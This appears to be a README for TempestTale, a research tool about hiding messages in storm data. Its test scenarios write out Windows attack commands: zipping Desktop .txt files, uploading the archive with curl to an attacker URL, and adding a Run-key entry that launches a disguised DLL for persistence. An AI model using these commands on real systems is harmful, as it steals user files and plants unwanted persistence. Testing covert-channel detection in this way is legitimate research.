# TempestTale
Tempest refers to a violent storm, hinting at messages being hidden within storm data.


## Requirements

To install all necessary dependencies, run the following command:

```bash
pip install -r requirements.txt


## Scenarios

1º Test - Obtaining all .txt files from the Desktop

powershell -c "Compress-Archive C:\\Users\\%USERNAME%\\Desktop\\*.txt C:\\Temp\\data.zip


2º Test - Uploading those .txt files to an Attackers' URL

curl -F 'file=@C:\\Temp\\data.zip' http://m.com/upload"


3 Test - Creating Persistence by Adding a Malicious DLL Disguised as Legitimate to the Windows Registry Key to Execute at System Startup

powershell -c "reg add HKCU\\Run /v a /t REG_SZ /d 'rundll32 c:\\mscoree.dll,a' /f"

4º Test - Random String that Could be Information to Update the Malware or a New Plugin

e3fbc1a0d292e4a93b1f4c7d2c60f90b3a7d925c312e8b4e8abf2d0f61778
